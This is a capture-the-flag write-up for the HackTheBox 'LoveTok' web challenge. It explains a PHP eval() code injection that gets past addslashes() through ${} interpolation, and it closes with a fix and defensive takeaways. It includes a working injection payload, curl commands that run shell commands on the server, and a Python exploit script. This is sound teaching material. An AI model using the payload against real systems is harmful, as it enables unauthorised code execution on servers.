## Overview

**LoveTok** is an Easy HackTheBox **Web** challenge. The app predicts when love
will come knocking by running a PHP `date()` call, and it lets you control the
format string. The only sanitiser is `addslashes()` — which does not escape
`${}`, so PHP's complex-variable interpolation evaluates an arbitrary expression
inside the `eval()`'d string and gives you [remote code execution](https://cwe.mitre.org/data/definitions/94.html) as the web user.

## The technique

The interesting code is in `models/TimeModel.php`:

```php
public function __construct($format) {
    $this->format = addslashes($format);          // the only sanitiser
    [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
    $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
}

public function getTime() {
    eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
    return isset($time) ? $time : 'Something went terribly wrong';
}
```

The `format` query parameter is escaped with `addslashes()` and then concatenated
straight into a string passed to `eval()`. `addslashes()` escapes exactly four
characters — `"`, `'`, `\` and NUL — so you can't break out of the double-quoted
string. But you don't need to.

PHP evaluates the **complex (curly) variable syntax** `${ expression }` *inside* a
double-quoted string, and none of `$ { } ( ) [ ]` is touched by `addslashes()`.
So an expression like `${system($_GET[cmd])}` placed in the format string is
parsed and executed when `eval()` runs: `system()` fires (printing its output),
and its return value is harmlessly used as a variable-variable name. The shell
command itself rides in a **separate, unquoted** parameter, so there is nothing
for `addslashes()` to mangle.

## Solution

Confirm code execution with `id`:

```bash
curl -s --get "http://TARGET:PORT/" \
  --data-urlencode 'format=${system($_GET[cmd])}' \
  --data-urlencode 'cmd=id'
# -> uid=1000(www) gid=1000(www) groups=1000(www)
```

The flag sits in a randomly-named file at `/`, so glob for it:

```bash
curl -s --get "http://TARGET:PORT/" \
  --data-urlencode 'format=${system($_GET[cmd])}' \
  --data-urlencode 'cmd=cat /flag* 2>/dev/null || find / -maxdepth 2 -iname "flag*" -exec cat {} +'
```

The whole thing wraps up in a small `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests
base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1"

def rce(cmd: str) -> str:
    r = requests.get(base + "/", params={"format": "${system($_GET[cmd])}", "cmd": cmd})
    return r.text

out = rce('cat /flag* 2>/dev/null || find / -maxdepth 2 -iname "flag*" -exec cat {} +')
for line in out.splitlines():
    if "HTB{" in line:
        print(line.strip())
        break
```

```bash
$ python3 solve.py http://TARGET:PORT
HTB{...}
```

## Why it worked

`addslashes()` is a quote-escaper, not an injection guard. The vulnerable code
assumes "if the attacker can't insert a quote, they can't escape the string" — but
PHP's `${}` interpolation never relies on quotes in the first place. Combined with
the fatal decision to pass user input to `eval()` at all, that single missing class
of escaped characters turns a date-formatting feature into full [server-side code injection](https://cwe.mitre.org/data/definitions/94.html).

## Fix / defense

Never feed user input to `eval()`. Drop the `eval()` wrapper entirely and validate
the format against an allow-list of date characters before passing it to `date()`:

```php
if (!preg_match('/^[dDjlNSwzWFmMntLoYyaABgGhHisuveTZcrU\s:\/.-]+$/', $_GET['format'])) {
    die('bad format');
}
$time = date($_GET['format']);
```

Three takeaways: escaping is not sandboxing; `${}` interpolation is immune to
quote-escaping; and any `eval()` / `assert()` / `preg_replace(/e)` / `date()`
wrapper around concatenated request input should be treated as RCE until proven
otherwise.
